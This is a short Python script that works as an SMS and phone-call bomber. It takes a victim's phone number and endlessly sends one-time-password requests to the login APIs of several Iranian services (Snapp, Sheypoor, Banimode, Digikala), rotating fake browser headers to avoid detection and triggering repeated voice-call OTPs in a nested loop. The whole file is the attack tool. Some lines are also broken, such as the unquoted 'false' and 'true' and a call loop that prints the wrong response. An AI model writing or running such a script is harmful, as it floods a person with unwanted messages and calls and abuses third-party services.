import requests
import time
import fake_headers

number = input("enter phonenumber without 0:")

         #.........add url and json for send sms and call.........
url_digic ="https://api.digikala.com/v1/user/authenticate/"
url_bani = "https://mobapi.banimode.com/api/v2/auth/request"
url_digi ="https://api.digikala.com/v1/user/authenticate/"
url_sn = "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp"
url_sh = "https://www.sheypoor.com/api/v10.0.0/auth/send"
url_banic = "https://mobapi.banimode.com/api/v2/auth/request"
json_sh = {"username":"0"+number}
json_banic = {"phone":"0"+number,"type":"call"}
json_bani = {"phone":"0"+number}
json_digi = {"backUrl":"/","username":"0"+number,"otp_call":false}
json_sn = {"cellphone":"+98"+number,"attestation":{"method":"skip","platform":"skip"},"extra_methods":[],"preferred_method":"sms_v2"}
json_digic = {"backUrl":"/","username":"0"+number,"otp_call":true,"force_send_otp":true}

         #.........send sms and create fake user agent.........
while True:
         #.........create fake user agent.........
  fake_header = fake_headers.random_browser()
         #.........send sms.........
  print("sanap status:")
  send_snapp= requests.post(url=url_sn,json=json_sn,headers=fake_header)
  print(send_snapp)

  print("shepor status:")
  send_shepor = requests.post(url=url_sh,json=json_sh,headers=fake_header)
  print(send_shepor)

  print("banimod status:")
  send_bani = requests.post(url=url_bani,json=json_bani,headers=fake_header)
  print(send_bani)

  print("digikala status:")
  send_digi = requests.post(url=url_digi,json=json_digi,headers=fake_header)
  print(send_digi)

  time.sleep(8)


         #.........send call.........
  while True:
   
   fake_head_call = fake_headers.random_browser()

   print("digikala(call) status:")
   send_digic = requests.post(url=url_digic,json=json_digic,headers=fake_head_call)
   print(send_digic)

   print("banimod(call) status:")
   send_banic = requests.post(url=url_banic,json=json_banic,headers=fake_head_call)
   print(send_digic)

   time.sleep(70)